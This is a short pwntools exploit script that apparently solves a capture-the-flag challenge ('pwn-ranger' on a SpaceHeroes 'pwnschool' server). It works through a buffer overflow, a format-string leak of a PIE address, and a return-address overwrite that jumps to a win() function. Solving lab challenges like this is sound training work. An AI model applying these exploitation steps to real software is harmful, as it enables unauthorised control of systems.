from pwn import *

# binary = 'pwn-ranger.bin'
# e = ELF(binary)

context.terminal = ["tmux", "splitw", "-h"]
context.update(arch='amd64',os='linux')

gs = '''
continue
'''

# def start():
    # if args.GDB:
        # return gdb.debug('./pwn-ranger', gdbscript=gs)
    # elif args.REMOTE:
        # return remote("spaceheroes-pwnschool.chals.io", 443, ssl=True, sni="spaceheroes-pwnschool.chals.io")
    # else:
        # return process(e.path)        
        
p = remote("spaceheroes-pwnschool.chals.io", 443, ssl=True, sni="spaceheroes-pwnschool.chals.io")

p.recvuntil(b'>>> ')
p.sendline(b'1')
p.recvuntil(b'>>> ')


# Overflowing the buffer in Step 1
p.sendline(cyclic(17))
p.recvuntil(b'>>> ')
p.sendline(b'2')
p.recvuntil(b'>>> ')


# Leaking the PIE address in Step 2
p.sendline(b'%9$p')
p.recvuntil(b' = ')
p.recvuntil(b' = ')
leak = int(p.recvline().strip(), 16)
p.recvuntil(b'>>> ')
p.sendline(b'3')
p.recvuntil(b'win(): ')
win_off = int(p.recvline().strip(), 16)

# Calculating win address in Step 3
win = leak + win_off

# Sometimes we need returns to line everything up
ret = win - 1


p.recvuntil(b'>>> ')
p.sendline(hex(win))
p.recvuntil(b'>>> ')
p.sendline(b'4')
p.recvuntil(b'function >>> ')

# Sending a bunch of returns to line up and overflow, then the address of win.
p.sendline(p64(ret) * 6 + p64(win))


p.interactive()
